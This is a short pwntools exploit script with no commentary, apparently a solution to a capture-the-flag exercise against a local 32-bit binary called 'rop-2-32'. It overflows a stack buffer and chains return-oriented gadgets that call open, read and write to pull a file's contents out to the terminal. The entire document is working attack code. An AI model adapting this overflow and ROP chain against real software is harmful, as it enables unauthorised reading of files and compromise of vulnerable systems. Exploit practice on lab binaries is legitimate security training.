#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process("./rop-2-32")
#gdb.attach(p)
buf = "A" *0x88 + "BBBB"

rd = p32(0x8048380)
opn = p32(0x80483b0)
wr = p32(0x80483d0)

pop2_ret = p32(0x0804868a)
pop_pop_pop_ret = p32(0x08048689)

buf += opn
buf += pop_pop_pop_ret
buf += p32(0x8048028) #'4'
buf += p32(0)
buf += p32(0)

buf += rd
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += wr
buf += pop_pop_pop_ret
buf += p32(1)
buf += p32(0x804a800)
buf += p32(100)




p.sendline(buf)
p.interactive()
